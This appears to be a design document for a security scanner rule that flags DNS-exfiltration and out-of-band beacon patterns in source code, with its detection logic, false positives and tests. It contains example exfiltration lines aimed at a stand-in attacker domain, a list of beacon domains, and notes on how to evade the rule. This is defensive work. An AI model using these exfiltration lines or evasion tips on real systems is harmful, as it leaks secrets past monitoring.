---
type: Guard
title: "dns-exfiltration-pattern"
description: "No DNS-exfiltration / OOB-beacon pattern in source."
timestamp: "2026-10-07T00:00:00Z"
guard_id: "dns-exfiltration-pattern"
checklist_section: ["8"]
standards: ["OWASP:A10"]
---

# No DNS-exfiltration / OOB-beacon pattern in source

_Author, 2026-10-07_

---

## The threat

DNS exfiltration encodes secret data into the subdomain label of a hostname and
resolves it (`f"{secret}.attacker.example.com"`), so the data leaves over DNS
queries even through an egress firewall that only inspects HTTP/HTTPS traffic. A
close cousin is beaconing to a known out-of-band-interaction service
(`burpcollaborator.net`, `canarytokens.com`) purely to prove a blind callback fired.
OWASP:A10 (Server-Side Request Forgery / unsafe egress family), CWE-201 (Insertion of
Sensitive Information Into Sent Data).

## Why this guard fits the stack

Adapted from Datadog GuardDog's `threat-network-dns-exfil` source-code rule and the
OOB-beacon half of `threat-npm-dependency-confusion`. GuardDog screens third-party
registry packages; this guard applies the same two signatures to the target
application's own source.

```python
socket.getaddrinfo(f"{secret}.attacker.example.com", 80)   # fires: data label + literal domain
socket.getaddrinfo(f"{host}", port)                        # ordinary dynamic host, silent
socket.getaddrinfo("api.example.com", 443)                 # ordinary, silent
```

## Detection design

1. `applies()` gates on `python`, `javascript`, or `typescript` in `profile.features`.
2. Scans `.py`/`.pyi` (dynamic-hostname rule, Python-specific) plus `.py`/`.js`/`.ts`/
   `.jsx`/`.tsx`/`.mjs`/`.cjs`/`.sh`/`.bash`/`.zsh` (OOB-beacon rule, language-agnostic).
3. `dynamic-hostname-dns`: interpolated data used as a subdomain LABEL directly in front
   of a literal domain of at least two labels. Python: `socket.getaddrinfo(...)`/
   `socket.gethostbyname(...)` whose first argument is `f"{data}.attacker.example.com"`,
   `"{}.attacker.example.com".format(data)`, or `data + ".attacker.example.com"`. Shell:
   `nslookup`/`dig` with `$VAR`, `${VAR}` or `$(cmd)` immediately followed by such a
   domain (`nslookup $(whoami).attacker.example.com`). A dynamic host on its own does not
   fire: `getaddrinfo(f"{host}", port)`, `dig +short -x "$ip"` (a reverse lookup, the
   flagship's `scripts/list-ssh-hosts.sh`), `dig +noall +answer A "$domain"` (a firewall
   allow-list builder) and `f"{host}.{domain}"` are how ordinary resolver code is written,
   and PR #1048's review measured two HIGH false positives from the earlier any-variable
   rule. A suffix whose last label is a private/special-use TLD (`local`, `localhost`,
   `internal`, `lan`, `home`, `corp`, `test`, `invalid`, `arpa`, `example`) does not fire
   either: `nslookup $SVC.default.svc.cluster.local` never reaches an outside server.
4. `oob-beacon`: `curl`/`wget` targeting `burpcollaborator.net`/`.me`, `oastify.com`,
   `canarytokens.com`, or `dnslog.cn`: domains with no legitimate production use.
   Deliberately excludes the broader dual-use dev-tool domain list (`ngrok.io`,
   `webhook.site`, `pastebin.com`) that GuardDog's separate `threat-network-exfiltration`
   rule also carries, since those are common and legitimate in local-dev/testing code.
5. Suppress an audited case with a whole-file pragma comment anywhere in the file:
   `# security: allow-dns-exfiltration-pattern`.
6. Both rules emit `severity="high"`, standards `["OWASP:A10", "CWE-201"]`.

## When NOT to flag

A DNS resolution of a literal hostname, or of a hostname held whole in a variable, is
completely ordinary and never fires: only data spliced in as a label of a fixed public
domain is the signal. A `curl`/`wget` to an ordinary domain, or a static `nslookup`/`dig`,
stays silent.

Known false-positive class: per-tenant or per-bucket virtual-host names have exactly the
exfiltration shape (`socket.getaddrinfo(f"{bucket}.s3.amazonaws.com", 443)`,
`f"{tenant}.myservice.example.net"`). The label is an identifier, not secret data, but the
regex cannot tell the two apart; a reviewed case takes the whole-file pragma.

## Tests

| Test | What it checks |
|---|---|
| `test_fires_on_dynamic_getaddrinfo_fstring` | f-string hostname in `getaddrinfo` fires |
| `test_fires_on_dynamic_gethostbyname_format` | `.format()` hostname in `gethostbyname` fires |
| `test_fires_on_shell_dynamic_nslookup` | `nslookup $VAR.attacker.example.com` fires |
| `test_fires_on_data_label_in_front_of_literal_domain` | concatenated and f-string data labels in front of a literal domain fire |
| `test_fires_on_shell_variable_label_in_front_of_literal_domain` | `"$chunk.attacker..."`, `$(whoami).attacker...`, `${DATA}.x.evil.io` fire |
| `test_passes_shell_dns_lookup_of_a_variable_host` | `dig -x "$ip"`, `dig A "$domain"`, `nslookup $HOST`, `"$sub.$domain"`, a `.cluster.local` suffix stay silent |
| `test_passes_python_resolver_with_dynamic_host` | `f"{host}"`, `'{}'.format(name)`, `f"{host}.{domain}"`, `prefix + "." + domain`, an `.internal` suffix stay silent |
| `test_fires_on_curl_to_oob_domain` | `curl` to `burpcollaborator.net` fires |
| `test_passes_literal_hostname_resolution` | literal-hostname `getaddrinfo` stays silent |
| `test_passes_curl_to_ordinary_domain` | `curl` to an ordinary domain stays silent |
| `test_passes_static_nslookup` | static `nslookup` stays silent |
| `test_pragma_suppresses_whole_file` | whole-file pragma suppresses |
| `test_does_not_apply_with_no_relevant_stack` | `applies()` is `False` with no relevant feature |

## Known bypasses

Building the dynamic hostname through an intermediate variable assigned on an earlier
line (rather than inline in the call), or splitting the domain into its own variable
(`f"{data}.{EXFIL_DOMAIN}"`), evades the regex, as does using a different DNS
API (`dns.resolver`, a raw `getent hosts` shell call) or a beacon domain outside the
four named here. This is a signature match on the most common idioms, not a data-flow
analysis.

## What this guard does NOT prove

A clean scan does not rule out exfiltration via an ordinary HTTP POST to a
not-obviously-suspicious domain, or DNS exfiltration built through a less common
resolver API. This guard only covers the two specific, high-confidence shapes above.

# Citations

[1] agentsec checklist item `8-dns-exfiltration-pattern` (§8)
[2] OWASP:A10
[3] CWE-201
[4] Datadog GuardDog `threat-network-dns-exfil` / `threat-npm-dependency-confusion`: https://github.com/DataDog/guarddog
